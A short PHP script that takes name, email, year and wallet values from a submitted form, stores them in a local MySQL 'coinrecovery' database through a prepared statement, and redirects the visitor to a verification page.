<?php

    $name = $_POST['name'];
    $email = $_POST['email'];
    $year = $_POST['year'];
    $wallet = $_POST['wallet'];

    $conn = new mysqli('localhost', 'root', '', 'coinrecovery');
    if ($conn->connect_error){
        die('connection failed : '.$conn->connect_error);

    }else {
        $stmt = $conn->prepare("insert into coin(name, email, year, wallet) values(?, ?, ?, ?)");
        $stmt->bind_param("ssis", $name, $email, $year, $wallet);
        $stmt->execute();
        header ("Location:verify.html");
        $stmt->close();
        $conn->close();
    }





?>